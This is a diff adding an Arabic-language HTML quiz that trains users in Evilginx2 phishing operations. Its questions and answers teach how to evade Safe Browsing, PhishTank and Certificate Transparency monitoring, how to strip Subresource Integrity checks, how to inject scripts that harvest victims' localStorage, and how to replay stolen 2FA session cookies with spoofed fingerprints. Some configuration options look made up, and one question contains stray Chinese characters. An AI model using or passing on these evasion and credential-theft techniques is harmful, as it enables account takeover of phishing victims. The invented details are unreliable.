+                correctExplanation: "Certificate Transparency (CT) هو نظام عام يُسجل كل شهادة SSL جديدة. إذا سجلت attack.com اليوم وغداً أرسلت رابطاً لشخص، يمكنه البحث في CT logs ويرى أن النطاق جديد ويُثير الشك.",
+                wrongExplanation: "SNI طبيعي. CT logs هي الأداة الحقيقية. Probes نادرة. السرعة لا تُفرق.",
+                consequences: "إذا كان هدفك متقدماً، سيفحص CT logs. إذا وجد attack.com مُسجلاً اليوم، لن يضغط الرابط. ستفشل الحملة قبل أن تبدأ."
+            },
+            {
+                difficulty: "hard",
+                question: "كيف تمنع Google من اكتشافك عبر Safe Browsing؟",
+                command: "config domain attack.com",
+                options: [
+                    { text: "لا تستطيع - Google يكتشف كل شيء", correct: false },
+                    { text: "تستخدم نطاقات جديدة ولا تُرسل إلى أحد", correct: false },
+                    { text: "تستخدم 'cloaking' لعرض محتوى بريء لـ Google bots", correct: true },
+                    { text: "تُعطل Google Safe Browsing في المتصفح", correct: false },
+                    { text: "تُشغل VPN", correct: false }
+                ],
+                correctExplanation: "Cloaking هو عرض محتوى مختلف لـ bots (مثل Googlebot). في phishlet، تضيف rule: if user_agent ~ 'Googlebot' → serve benign page. Google لا يضعك في القائمة السوداء.",
+                wrongExplanation: "Google يكتشف معظم النطاقات الجديدة. تعطيل Safe Browsing لا يمنع Google. VPN لا علاقة له بالـ bots.",
+                consequences: "إذا لم تستخدم cloaking، سينضم نطاقك إلى Google Safe Browsing blacklist في غضون 24-48 ساعة. كل المتصفحات ستُحذر المستخدمين."
+            },
+            {
+                difficulty: "hard",
+                question: "لماذا بعض 2FA tokens لا تعمل بعد التقاطها؟",
+                command: "auth_tokens add .facebook.com 'c_user'",
+                options: [
+                    { text: "لأن الـ token مرتبط بـ IP", correct: false },
+                    { text: "لأن الـ token مرتبط بـ time window قصير", correct: false },
+                    { text: "لأن الـ token مربوط بـ User-Agent وعوامل بيئة أخرى", correct: true },
+                    { text: "2FA tokens لا تُلتقط أبداً", correct: false },
+                    { text: "لأن Evilginx2 لا تدعم 2FA", correct: false }
+                ],
+                correctExplanation: "بعض المواقع الكبرى (Google, Facebook) تستخدم 'browser fingerprinting'. Token لا يكفي - يجب أن تُطابق User-Agent، timezone، screen resolution، والمزيد. إذا لم تُعدل environment، Token سينرفض.",
+                wrongExplanation: "2FA tokens تُلتقط تماماً. Evilginx2 يدعمها. المشكلة ليست الـ IP أو الوقت، بل البصمة الكاملة للمتصفح.",
+                consequences: "إذا التقطت token ولم تُعدل environment الخاص بك، ستُرسب الجلسة عند محاولة الاستخدام. هذا يعني أنك حصلت على token لا قيمة له."
+            },
+            // --- 6 أسئلة خبير (5 خيارات) ---
+            {
+                difficulty: "expert",
+                question: "كيف تُحقن payload في JavaScript يتم تحميله ديناميكياً؟",
+                command: "sub_filters:\n  - {search: 'const API_KEY=', replace: 'const API_KEY='}",
+                options: [
+                    { text: "تُعدل phishlet بـ sub_filter لتحل محل الـ script", correct: false },
+                    { text: "تستخدم redirect_url لتوجيه JS إلى خادمك", correct: false },
+                    { text: "تستخدم sub_filter مع mime_type 'application/javascript'", correct: true },
+                    { text: "لا يمكن تعديل JS مباشرة", correct: false },
+                    { text: "تستخدم وضع التصحيح فقط", correct: false }
+                ],
+                correctExplanation: "sub_filters يدعم mimes: ['application/javascript']. يمكنك البحث عن const API_KEY='xxx' واستبدالها بـ const API_KEY='your_key'. هذا يُنشئ backdoor في JS المُعكس.",
+                wrongExplanation: "يمكن تعديل JS تماماً. غير redirect_url. وضع التصحيح ليس للاستخدام النهائي. sub_filter هو الأداة الصحيحة.",
+                consequences: "إذا لم تفهم كيف تتعامل مع JS، لن تستطيع bypass تقنيات أمان متقدمة تعتمد على JS لتشفير البيانات قبل الإرسال."
+            },
+            {
+                difficulty: "expert",
+                question: "ما هو 'trigger action' ومتى تستخدمه؟",
+                command: "triggers:\n  - {url: '/login', action: 'capture_creds'}",
+                options: [
+                    { text: "لإرسال بريد إلكتروني عند تسجيل دخول الضحية", correct: false },
+                    { text: "لالتقاط بيانات عند زيارة صفحة معينة بدون تدخل يدوي", correct: true },
+                    { text: "لإيقاف phishlet تلقائياً", correct: false },
+                    { text: "لتغيير النطاق", correct: false },
+                    { text: "لإنشاء تقرير", correct: false }
+                ],
+                correctExplanation: "Triggers تلتقط بيانات عندما يصل المستخدم إلى URL محدد. مثلاً، عندما يزور /login، trigger يُفعّل capture_creds. هذا أتمتة ولا تحتاج أن تنتظر ضغط يدوي.",
+                wrongExplanation: "Triggers لا ترسل بريد، لا تُعدي النطاق، لا تُنشئ تقارير. وظيفتها الوحيدة هي الأتمتة بناءً على الأحداث.",
+                consequences: "إذا لم تستخدم triggers، ستضطر لمراقبة كل ضحية يدوياً. في 1000 ضحية، هذا كارثة عملياتية. Triggers تجعله أتمتة."
+            },
+            {
+                difficulty: "expert",
+                question: "كيف تُخفي Evilginx2 من أدوات Phishing Detection مثل PhishTank؟",
+                command: "config domain attack.com\nconfig ip 1.2.3.4",
+                options: [
+                    { text: "تستخدم IP جديد فقط", correct: false },
+                    { text: "تُعطي كل ضحية نطاقاً فرعياً مختلفاً", correct: true },
+                    { text: "لا يمكن الإخفاء من PhishTank", correct: false },
+                    { text: "تستخدم VPN", correct: false },
+                    { text: "تُعطل الـ proxy", correct: false }
+                ],
+                correctExplanation: "تُنشئ wildcard SSL وتُعطي كل ضحية نطاقاً فرعياً عشوائياً: user1.attack.com, user2.attack.com. PhishTank يحتاج URL مُحدد لإضافته. إذا كل ضحية لها URL مختلف، لا يمكنهم إضافة كل شيء.",
+                wrongExplanation: "IP جديد لا يكفي. PhishTank يشاهد domains. VPN لا يُخفي من قوائم blacklists. Wildcard subdomains هي الحل.",
+                consequences: "إذا استخدمت نطاق ثابت، سينضم إلى PhishTank في أقل من 24 ساعة. كل ضحاياك المستقبلية سيرون تحذير المتصفح."
+            },
+            {
+                difficulty: "expert",
+                question: "كيف تتعامل مع مواقع تستخدم 'Subresource Integrity' (SRI)؟",
+                command: "sub_filters:\n  - {search: 'integrity=', replace: ''}",
+                options: [
+                    { text: "تُعطل SRI في المتصفح", correct: false },
+                    { text: "تستخدم sub_filter لإزالة integrity checks", correct: true },
+                    { text: "لا يمكن - SRI يمنع الـ proxy", correct: false },
+                    { text: "تستخدم نسخة قديمة من الموقع", correct: false },
+                    { text: "تُغيّر hash يدوياً", correct: false }
+                ],
+                correctExplanation: "SRI تُحقق من hash الـ scripts. إذا عدّلت أي شيء، المتصفح يرفض تنفيذ JS. الحل: استخدم sub_filter لحذف الـ integrity attributes تماماً. JS سيُنفذ بدون تحقق.",
+                wrongExplanation: "SRI لا تُعطل في المتصفح. يمكنها منع الـ proxy إذا لم تتعامل معها. الحل الصحيح هو حذف الـ attributes وليس تغيير hash.",
+                consequences: "إذا لم تحذف integrity checks، أي تعديل على JS سيجعل الصفحة لا تعمل. الضحية سيُرى صفحة بيضاء وسيعلم أن شيئاً خاطئاً."
+            },
+            {
+                difficulty: "expert",
+                question: "ما هو 'luring' وكيف يختلف عن 'phishing'؟",
+                command: "lures create linkedin",
+                options: [
+                    { text: "luring هو نفس phishing - مسميات متطابقة", correct: false },
+                    { text: "luring هو إنشاء رابط مُخصص لضحية معينة مع تتبع", correct: true },
+                    { text: "luring هو إرسال بريد إلكتروني فقط", correct: false },
+                    { text: "luring لا يستخدم في Evilginx2", correct: false },
+                    { text: "luring هو اسم قديم لم يعد يُستخدم", correct: false }
+                ],
+                correctExplanation: "Luring في Evilginx2 يعني إنشاء رابط مُخصص: lures create linkedin → ينشئ رابط unique ID. يمكنك تتبع أي ضحية فتحت الرابط، من أي IP، ومتى. هذا أداة تتبع متقدمة.",
+                wrongExplanation: "luring ليس فقط بريد. هو جزء من phishing لكنه أداة تتبع. Evilginx2 يستخدمه بشكل أساسي.",
+                consequences: "إذا لم تستخدم lures، لن تعرف أي ضحية نجحت. في حملة كبيرة، هذا يعني فشل جمع analytics."
+            },
+            {
+                difficulty: "expert",
+                question: "كيف تمنع 'browser fingerprinting' من كشف الاختلافات بين المتصفح الحقيقي والمزيف؟",
+                command: "config user_agent 'Mozilla/5.0'\nconfig js_inject 'window.screen.width=1920'",
+                options: [
+                    { text: "تستخدم user_agent فقط", correct: false },
+                    { text: "تُحقن JavaScript لتعديل navigator properties", correct: true },
+                    { text: "لا يمكن منع الـ fingerprinting", correct: false },
+                    { text: "تستخدم Tor", correct: false },
+                    { text: "تعطل JS", correct: false }
+                ],
+                correctExplanation: "Fingerprinting يتحقق من screen.width, navigator.language, timezone, plugins. تحتاج js_inject لتغيير كل هذه القيم لتطابق متصفح الضحية. user_agent وحده لا يكفي.",
+                wrongExplanation: "user_agent لا يكفي. يمكنك منع fingerprinting بتعديل JS. Tor لا يخفي هذه الخصائص. تعطيل JS يكسر الموقع.",
+                consequences: "إذا لم تُعدل الـ fingerprint، الموقع المُزيف قد يعمل لكن token لن يُقبل لأن fingerprint لا يطابق. هذا يكشف أنك تستخدم جهاز مختلف."
+            },
+            {
+                difficulty: "expert",
+                question: "ما هي 'request smuggling' في سياق Evilginx2 وكيف تمنعها؟",
+                command: "config domain attack.com",
+                options: [
+                    { text: "طلب HTTP يحتوي على طلبين - Evilginx2 يعالجه تلقائياً", correct: false },
+                    { text: "تحتاج تهيئة خاصة لـ headers لمنع الفصل الخاطئ", correct: true },
+                    { text: "Evilginx2 لا يُعالج الـ smuggling", correct: false },
+                    { text: "يقوم بـ smuggling تلقائياً", correct: false },
+                    { text: "لا تستخدم HTTP/2", correct: false }
+                ],
+                correctExplanation: "HTTP Request Smuggling يستغل اختلاف في تحليل headers بين frontend وbackend. في Evilginx2، تحتاج تهيئة headers_double_crlf: false و content_length: strict لمنع الطلبات المُزدوجة.",
+                wrongExplanation: "Evilginx2 لا يعالج smuggling تلقائياً. لا يقوم به. HTTP/2 ليس الحل. التهيئة headers هي الحل.",
+                consequences: "إذا لم تمنع smuggling، مهاجم قد يستغل الـ proxy لإرسال طلبات خبيثة إلى الخادم المُزيف. هذا يكشف الـ proxy أو يُسقطه."
+            },
+
+            // --- 6 أسئلة خبير إضافية لتكملة الـ 20 سؤال ---
+            {
+                difficulty: "expert",
+                question: "كيف تُدير 1000+ ضحية بدون فقدان البيانات في حالة إعادة تشغيل الخادم؟",
+                command: "config db sqlite evilginx.db",
+                options: [
+                    { text: "تستخدم قاعدة بيانات SQLite مدمجة", correct: true },
+                    { text: "تُحفظ البيانات في ذاكرة فقط", correct: false },
+                    { text: "تُستخدم قاعدة بيانات خارجية MySQL", correct: false },
+                    { text: "لا يمكن حفظ البيانات", correct: false },
+                    { text: "تستخدم JSON files", correct: false }
+                ],
+                correctExplanation: "Evilginx2 يستخدم SQLite افتراضياً. كل البيانات (sessions, lures, stats) تُحفظ تلقائياً في evilginx.db. إذا أعدت التشغيل، لا تفقد شيئاً.",
+                wrongExplanation: "لا تُحفظ في ذاكرة فقط. MySQL غير مدعوم. JSON غير مستخدم. SQLite هي الحل.",
+                consequences: "إذا لم تعرف أن SQLite موجودة، قد تفقد كل البيانات إذا أغلقت الخادم. هذا كارثة في حملة كبيرة."
+            },
+            {
+                difficulty: "expert",
+                question: "ما هو الفرق بين config blacklist和国家 blacklist؟",
+                command: "blacklist add country RU",
+                options: [
+                    { text: "لا فرق - نفس القائمة", correct: false },
+                    { text: "الأولى تحظر IPs، الثانية تحظر countries عبر GeoIP", correct: true },
+                    { text: "الأولى تحظر users، الثانية تحظر domains", correct: false },
+                    { text: "الواحدة لـ whitelist والأخرى لـ blacklist", correct: false },
+                    { text: "الواحدة دائمة والأخرى مؤقتة", correct: false }
+                ],
+                correctExplanation: "config blacklist تضيف IP addresses محددة. blacklist add country تستخدم قاعدة GeoIP لتحظر كل IPs من دولة كاملة. مثلاً: blacklist add country CN تحظر كل الصين.",
+                wrongExplanation: "هما مختلفتان. ليست نفس القائمة. لا علاقة لهما بـ users أو whitelist. كلاهما دائم حتى تُزيله.",
+                consequences: "إذا استخدمت blacklist بدون فهم، قد تحظر دولة كاملة بدلاً من IP واحد. هذا يمنع ضحايا محتملين."
+            },
+            {
+                difficulty: "expert",
+                question: "كيف تتعامل مع 'HSTS' الذي يفرض HTTPS صارم؟",
+                command: "certificates create attack.com\nconfig force_https true",
+                options: [
+                    { text: "تستخدم HTTP فقط", correct: false },
+                    { text: "تُجبر HTTPS وتستخدم شهادة صالحة", correct: true },
+                    { text: "تعطل HSTS في المتصفح", correct: false },
+                    { text: "HSTS لا يؤثر على Evilginx2", correct: false },
+                    { text: "تستخدم نسخة قديمة من الموقع", correct: false }
+                ],
+                correctExplanation: "HSTS يُجبر المتصفح على استخدام HTTPS مع شهادة صالحة. تحتيد certificates create و force_https: true. لا تعمل HTTP لأن المتصفح يرفضه.",
+                wrongExplanation: "HTTP لا يعمل مع HSTS. لا يمكن تعطيل HSTS. HSTS يؤثر إذا لم تستخدم HTTPS. لا حاجة لنسخ قديمة.",
+                consequences: "إذا لم تُجبر HTTPS، متصفح الضحية يرفض حتى opening الموقع. هذا يكشف أنك لست الموقع الحقيقي."
+            },
+            {
+                difficulty: "expert",
+                question: "ما هي 'payload injection' في سياق Evilginx2 ومتى تستخدمها؟",
+                command: "js_inject https://attack.com/payload.js",
+                options: [
+                    { text: "لإضافة keylogger إلى الصفحة", correct: false },
+                    { text: "لإضافة JavaScript يجمع بيانات إضافية لا تُلتقط عادة", correct: true },
+                    { text: "لتسريع الصفحة", correct: false },
+                    { text: "لإضافة إعلانات", correct: false },
+                    { text: "لا تستخدم - خطرة", correct: false }
+                ],
+                correctExplanation: "js_inject تُحقن script إضافي. مثلاً: تجمع localStorage data، أو تقوم بـ fingerprinting إضافي، أو تُعطل defense mechanisms. هذا يوسع قدرات جمع البيانات.",
+                wrongExplanation: "Keylogger جزء منه لكن ليس كله. لا تسريع. لا إعلانات. هي خطرة لكن مفيدة إذا استخدمت بحذر.",
+                consequences: "إذا لم تستخدم injection، قد تفقد بيانات مهمة مثل localStorage التي لا تُرسل عادة في requests. هذا يقلل من جودة البيانات المسروقة."
+            },
+            {
+                difficulty: "expert",
+                question: "كيف تستخدم Evilginx2 في 'red team' بدون كشف Blue team؟",
+                command: "config domain legit-corp.com\nconfig db sqlite stealth.db",
+                options: [
+                    { text: "تستخدم نطاق يبدو شرعياً وتُقلل من requests", correct: true },
+                    { text: "تستخدم نطاقات غريبة لجذب الانتباه", correct: false },
+                    { text: "تُرسل الكثير من البريد لتسريع الحملة", correct: false },
+                    { text: "لا تستخدم encryption", correct: false },
+                    { text: "تستخدم نسخة قديمة من Evilginx2", correct: false }
+                ],
+                correctExplanation: "في red team، تختار نطاق يبدو جزءاً من البيئة (مثلاً: login-corp.com إذا كان الهدف corp.com). تُقلل requests (timing T2) لتجنب IDS. هذا يجعلك تبدو كـ legitimate traffic.",
+                wrongExplanation: "نطاقات غريبة تُكتشف سريعاً. الكثير من البريد يُثير الشك. عدم encryption يُثير الشك. النسخ القديمة لها bugs معروفة.",
+                consequences: "إذا استخدمت نطاقات غريبة أو سلوكاً عدوانياً، Blue team سيدركون في أقل من ساعة. الحملة تفشل وقد تُطرد من الاختبار."
+            },
+            {
+                difficulty: "expert",
+                question: "ما هي 'session hijacking' وكيف تمنعها في Evilginx2؟",
+                command: "auth_tokens add .facebook.com 'c_user; xs'",
+                options: [
+                    { text: "سرقة جلسة الضحية - تمنعها بـ IP whitelist", correct: false },
+                    { text: "سرقة جلسة الضحية - تمنعها بـ fingerprinting", correct: false },
+                    { text: "سرقة جلسة الضحية لا يمكن منعها عبر Evilginx2", correct: true },
+                    { text: "تمنعها بـ blocking bots", correct: false },
+                    { text: "تمنعها بـ rate limiting", correct: false }
+                ],
+                correctExplanation: "Evilginx2 هو أداة hijacking نفسها. لا تمنع hijacking. إذا كان شخص ما يستخدم Evilginx2 ضدك، لا يمكنك منع ذلك من خلاله. تحتاج defense خارجية (2FA hardware keys، IP restrictions).",
+                wrongExplanation: "Evilginx2 لا يحميك من hijacking. IP whitelist لا يمنع. Fingerprinting لا يمنع. Bots blocking لا علاقة.",
+                consequences: "إذا اعتقدت أن Evilginx2 يحميك، ستكون عرضة للهجوم. يجب استخدام مفاتيح 2FA المادية (YubiKey) لأنها لا تعتمد على tokens يمكن خداعها."
+            }
+        ];
+
+        // ==== دوال الامتحان ====
+        function startExam() {
+            examStarted = true;
+            currentLesson = 1;
+            score = 0;
+            mistakes = [];
+            
+            // إخفاء الدليل
+            document.querySelectorAll('.section').forEach(s => s.classList.add('hidden'));
+            document.querySelector('.exam-button').classList.add('hidden');
+            
+            renderExam();
+        }
+
+        function getRandomCorrectPosition() {
+            // مبتدئ: 3 خيارات (مواضع 0,1,2)
+            // صعب/خبير: 5 خيارات (مواضع 0,1,2,3,4)
+            // نُرجع موضع عشوائي في المدى الصحيح ونُحدد عدد الخيارات
+            const q = examQuestions[currentLesson-1];
+            const optionCount = q.options.length;
+            const correctPos = Math.floor(Math.random() * optionCount);
+            
+            // نعيد ترتيب الخيارات لضمان أن الإجابة الصحيحة في الموقع العشوائي
+            const correctOption = q.options.find(o => o.correct);
+            const incorrectOptions = q.options.filter(o => !o.correct);
+            
+            const shuffled = [];
+            for (let i = 0; i < optionCount; i++) {
+                if (i === correctPos) {
+                    shuffled.push(correctOption);
+                } else {
+                    shuffled.push(incorrectOptions.pop());
+                }
+            }
+            
+            return { shuffled, correctPos };
+        }
+
+        function renderExam() {
+            const container = document.getElementById('examContainer');
+            container.classList.remove('hidden');
+            
+            const q = examQuestions[currentLesson-1];
+            const progress = (currentLesson / examQuestions.length) * 100;
+            
+            // خلط الخيارات
+            const { shuffled, correctPos } = getRandomCorrectPosition();
+            
+            container.innerHTML = `
+                <!-- شريط التقدم -->
+                <div class="header">
+                    <h1>🎮 الامتحان التفاعلي</h1>
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: ${progress}%"></div>
+                    </div>
+                    <div class="progress-text">التقدم: ${Math.round(progress)}% (${currentLesson} من ${examQuestions.length} أسئلة)</div>
+                </div>
+
+                <!-- السؤال الحالي -->
+                <div class="lesson-card fade-in" id="question${currentLesson}">
+                    <h2 class="lesson-title">
+                        السؤال رقم ${currentLesson}: 
+                        <span class="difficulty-badge difficulty-${q.difficulty}">
+                            ${q.difficulty === 'easy' ? 'مبتدئ' : 
+                              q.difficulty === 'medium' ? 'متوسط' : 
+                              q.difficulty === 'hard' ? 'صعب' : 'خبير'}
+                        </span>
+                    </h2>
+                    
+                    <div class="lesson-content">
+                        <p><strong>${q.question}</strong></p>
+                        ${q.command ? `<div class="command-example" onclick="copyCommand(this)">${q.command}</div>` : ''}
+                    </div>
+
+                    <div class="quiz-section">
+                        <div class="quiz-question">🎯 اختر الإجابة الصحيحة:</div>
+                        <div class="quiz-options" id="options${currentLesson}">
+                            ${shuffled.map((opt, idx) => `
+                                <div class="quiz-option" data-correct="${idx === correctPos}" onclick="checkAnswer(this)">
+                                    ${opt.text}
+                                </div>
+                            `).join('')}
+                        </div>
+                        <div class="feedback" id="feedback${currentLesson}"></div>
+                    </div>
+
+                    <div class="nav-buttons">
+                        <button class="btn" ${currentLesson === 1 ? 'disabled' : ''} onclick="previousQuestion()">← السابق</button>
+                        <button class="btn" id="nextBtn" disabled onclick="nextQuestion()">
+                            ${currentLesson === examQuestions.length ? 'عرض النتائج النهائية' : 'التالي →'}
+                        </button>
+                    </div>
+                </div>
+            `;
+        }
+
+        function checkAnswer(element) {
+            const isCorrect = element.dataset.correct === "true";
+            const feedback = document.getElementById(`feedback${currentLesson}`);
+            const nextBtn = document.getElementById('nextBtn');
+            
+            // تعطيل جميع الخيارات
+            document.querySelectorAll(`#options${currentLesson} .quiz-option`).forEach(opt => {
+                opt.classList.add('disabled');
+                if (opt.dataset.correct === "true") {
+                    opt.classList.add('correct');
+                } else {
+                    opt.classList.add('incorrect');
+                }
+            });
+
+            // إظهار التغذية الراجعة
+            feedback.style.display = 'block';
+            feedback.classList.add(isCorrect ? 'correct' : 'incorrect');
+            
+            const q = examQuestions[currentLesson-1];
+            
+            if (isCorrect) {
+                feedback.innerHTML = `
+                    <strong>✅ إجابة صحيحة!</strong><br>
+                    ${q.correctExplanation}
+                `;
+                score++;
+            } else {
+                feedback.innerHTML = `
+                    <strong>❌ إجابة خاطئة!</strong><br>
+                    ${q.wrongExplanation}
+                    <div class="consequences-box">
+                        <strong>⚠️ تبعات الخطأ في الواقع:</strong><br>
+                        ${q.consequences}
+                    </div>
+                `;
+                
+                mistakes.push({
+                    question: q.question,
+                    wrongAnswer: element.textContent.trim(),
+                    correctAnswer: q.options.find(o => o.correct).text
+                });
+            }
+            
+            nextBtn.disabled = false;
+        }
+
+        function nextQuestion() {
+            if (currentLesson === examQuestions.length) {
+                showFinalResults();
+                return;
+            }
+            
+            currentLesson++;
+            renderExam();
+        }
+
+        function previousQuestion() {
+            if (currentLesson > 1) {
+                currentLesson--;
+                renderExam();
+            }
+        }
+
+        function showFinalResults() {
+            const container = document.getElementById('examContainer');
+            const scorePercent = (score / examQuestions.length) * 100;
+            
+            let message = "";
+            let level = "";
+            
+            if (scorePercent >= 90) {
+                level = "خبير Evilginx2";
+                message = "🎉 ممتاز! أنت جاهز لعمليات phishing متقدمة بشكل احترافي وفهم كامل.";
+            } else if (scorePercent >= 70) {
+                level = "متقدم";
+                message = "👍 جيد جداً! لكن راجع الأخطاء المتقدمة وافهم التبعات قبل الاستخدام الحقيقي.";
+            } else if (scorePercent >= 50) {
+                level = "متوسط";
+                message = "⚠️ جيد، لكن لا تزال هناك أخطاء خطيرة. أنصح بالمزيد من التدريب على الحالات المعقدة.";
+            } else {
+                level = "مبتدئ";
+                message = "❌ تحتاج تدريباً أساسياً. هذه الأخطاء قد تسبب كوارث حقيقية. ابدأ بإعدادات بسيطة.";
+            }
+            
+            container.innerHTML = `
+                <div class="lesson-card fade-in">
+                    <h2 class="lesson-title">🎊 النتائج النهائية</h2>
+                    
+                    <div style="text-align: center; margin: 30px 0;">
+                        <div style="font-size: 3em; color: ${scorePercent >= 70 ? '#00ff88' : '#ffaa00'}; margin-bottom: 20px;">
+                            ${score} من ${examQuestions.length}
+                        </div>
+                        <div style="font-size: 1.5em; color: #00d4ff; margin-bottom: 10px;">
+                            ${level}
+                        </div>
+                        <div style="font-size: 1.1em; color: #aaa;">
+                            ${message}
+                        </div>
+                    </div>
+
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: ${scorePercent}%"></div>
+                    </div>
+
+                    ${mistakes.length > 0 ? `
+                        <div style="margin-top: 30px;">
+                            <h3 style="color: #ffaa00; margin-bottom: 20px;">📚 مراجعة الأخطاء:</h3>
+                            ${mistakes.map((m, idx) => `
+                                <div class="example-box" style="margin-bottom: 15px;">
+                                    <h4 style="color: #ff6666;">❌ خطأ ${idx + 1}:</h4>
+                                    <p><strong>السؤال:</strong> ${m.question}</p>
+                                    <p><strong>إجابتك الخاطئة:</strong> <span style="color: #ff6666;">${m.wrongAnswer}</span></p>
+                                    <p><strong>الإجابة الصحيحة:</strong> <span style="color: #00ff88;">${m.correctAnswer}</span></p>
+                                </div>
+                            `).join('')}
+                        </div>
+                    ` : `
+                        <div class="example-box" style="margin-top: 30px; text-align: center;">
+                            <h3 style="color: #00ff88;">🎉 لا أخطاء! أداء مثالي.</h3>
+                        </div>
+                    `}
+
+                    <div class="nav-buttons" style="margin-top: 30px;">
+                        <button class="btn" onclick="location.reload()">🔄 إعادة التعلم من البداية</button>
+                        <button class="btn btn-success" onclick="window.open('https://github.com/kgretzky/evilginx2')">📖 مستودع Evilginx2 الرسمي</button>
+                    </div>
+                </div>
+            `;
+        }
+    </script>
+</body>
+</html>
